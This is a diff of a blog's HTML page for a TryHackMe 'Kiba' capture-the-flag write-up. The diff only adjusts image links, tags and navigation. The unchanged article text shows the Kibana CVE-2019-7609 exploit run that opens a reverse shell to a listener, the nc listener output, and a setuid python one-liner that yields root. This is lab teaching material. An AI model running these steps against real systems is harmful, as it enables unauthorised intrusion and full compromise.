@@ -74,12 +74,12 @@ Room Kiba OS Linux Difficulty Easy Room Link https://tryhackme.com/room/kiba Cre
 What is the version of visualization dashboard installed in the server?" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://sh3bu.github.io/posts/kiba/" />
-<meta property="og:image" content="https://sh3bu.github.io/null" /><meta property="article:section" content="posts" />
+<meta property="og:image" content="https://sh3bu.github.io/img/0.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-06-07T00:00:00+00:00" />
 <meta property="article:modified_time" content="2023-06-07T00:00:00+00:00" />
 
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://sh3bu.github.io/null" />
+<meta name="twitter:image" content="https://sh3bu.github.io/img/0.png" />
 <meta name="twitter:title" content="Kiba - THM"/>
 <meta name="twitter:description" content="Kiba is a easy rated room from tryhackme where we exploit a prototype pollution vulnerability to gain a user shell &amp; then escalate our privileges to root by exploiting a python3 binary which has setuid capabilities.
 Room Kiba OS Linux Difficulty Easy Room Link https://tryhackme.com/room/kiba Creator stuxnet What is the vulnerability that is specific to programming languages with prototype-based inheritance? Vulnerability - Prototype Pollution
@@ -119,7 +119,7 @@ What is the version of visualization dashboard installed in the server?"/>
   "articleBody": "Kiba is a easy rated room from tryhackme where we exploit a prototype pollution vulnerability to gain a user shell \u0026 then escalate our privileges to root by exploiting a python3 binary which has setuid capabilities.\nRoom Kiba OS Linux Difficulty Easy Room Link https://tryhackme.com/room/kiba Creator stuxnet What is the vulnerability that is specific to programming languages with prototype-based inheritance? Vulnerability - Prototype Pollution\nWhat is the version of visualization dashboard installed in the server? Go to Management tab , there we can find the version of kiba that is running.\nVersion - 6.5.4\nWhat is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000 / A simple google search reveals the CVE number.\nCVE ID - CVE-2019-7609\nCompromise the machine and locate user.txt An python3 exploit for prototype pollution is available on github for kibana 6.5.4\nhttps://github.com/LandGrey/CVE-2019-7609 Run the Exploit\namrita22005client@ubuntu:~/kiba$ python3 exploit.py http://10.10.38.106:5601 10.17.45.3 4444 /home/amrita22005client/kiba/exploit.py:15: DeprecationWarning: The distutils package is deprecated and slated for removal in Python 3.12. Use setuptools or check PEP 632 for potential alternatives from distutils.version import StrictVersion [•] Kibana version identified: 6.5.4 [✓] Version is vulnerable [✓] Target seems vulnerable [✓] Exploit completed [➜] Check your listener on 10.17.45.3:4444 We get our reverse shell \u0026 also the user.txt flag.\nshebut@ubuntu:~/kiba$ nc -lvnp 4444 Listening on 0.0.0.0 4444 Connection received on 10.10.38.106 48624 bash: cannot set terminal process group (945): Inappropriate ioctl for device bash: no job control in this shell To run a command as administrator (user \"root\"), use \"sudo \". See \"man sudo_root\" for details. kiba@ubuntu:/home/kiba/kibana/bin$ id id uid=1000(kiba) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare) kiba@ubuntu:/home/kiba/kibana/bin$ cd ~ cd ~ kiba@ubuntu:/home/kiba$ cat user.txt cat user.txt THM{1s_*********_rce} Capabilities is a concept that provides a security system that allows “divide” root privileges into different values\nHow would you recursively list all of these capabilities? Command to list all capabilities - getcap -r /\nkiba@ubuntu:/home/kiba/kibana/bin$ getcap -r / 2\u003e/dev/null /home/kiba/.hackmeplease/python3 = cap_setuid+ep /usr/bin/mtr = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep Straightaway we can see that python3 has a suspicious path.\nWe can refer GTFOBINS to exploit the python binary which has setuid capabilities by runing the command python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\n# id uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare) # cat /root/root.txt THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es} Now we have our root shell \u0026 our root.txt flag.\n",
   "wordCount" : "378",
   "inLanguage": "en",
-  "image":"https://sh3bu.github.io/null","datePublished": "2023-06-07T00:00:00Z",
+  "image":"https://sh3bu.github.io/img/0.png","datePublished": "2023-06-07T00:00:00Z",
   "dateModified": "2023-06-07T00:00:00Z",
   "author":{
     "@type": "Person",
@@ -213,7 +213,10 @@ What is the version of visualization dashboard installed in the server?"/>
 
 </div>
   </header> 
-<figure class="entry-cover"><img loading="lazy" src="https://sh3bu.github.io/null" alt="">
+<figure class="entry-cover">
+        <img loading="lazy" srcset="https://sh3bu.github.io/posts/kiba/img/0_hue5266938b99b28a03bec603b1496d607_39711_360x0_resize_box_3.png 360w ,https://sh3bu.github.io/posts/kiba/img/0_hue5266938b99b28a03bec603b1496d607_39711_480x0_resize_box_3.png 480w ,https://sh3bu.github.io/posts/kiba/img/0_hue5266938b99b28a03bec603b1496d607_39711_720x0_resize_box_3.png 720w ,https://sh3bu.github.io/posts/kiba/img/0_hue5266938b99b28a03bec603b1496d607_39711_1080x0_resize_box_3.png 1080w ,https://sh3bu.github.io/posts/kiba/img/0_hue5266938b99b28a03bec603b1496d607_39711_1500x0_resize_box_3.png 1500w ,https://sh3bu.github.io/posts/kiba/img/0.png 1572w" 
+            sizes="(min-width: 768px) 720px, 100vw" src="https://sh3bu.github.io/posts/kiba/img/0.png" alt="" 
+            width="1572" height="272">
         <p><text></p>
 </figure><div class="toc">
     <details >
@@ -344,16 +347,11 @@ What is the version of visualization dashboard installed in the server?"/>
   <footer class="post-footer">
     <ul class="post-tags">
       <li><a href="https://sh3bu.github.io/tags/kiba/">kiba</a></li>
-      <li><a href="https://sh3bu.github.io/tags/elastic/">Elastic</a></li>
+      <li><a href="https://sh3bu.github.io/tags/elastic/">elastic</a></li>
       <li><a href="https://sh3bu.github.io/tags/prototype-pollution/">prototype pollution</a></li>
       <li><a href="https://sh3bu.github.io/tags/cve-2019-7609/">CVE-2019-7609</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="https://sh3bu.github.io/posts/itsybitsy/">
-    <span class="title">« Prev</span>
-    <br>
-    <span>ItsyBitsy - THM</span>
-  </a>
   <a class="next" href="https://sh3bu.github.io/posts/napping/">
     <span class="title">Next »</span>
     <br>
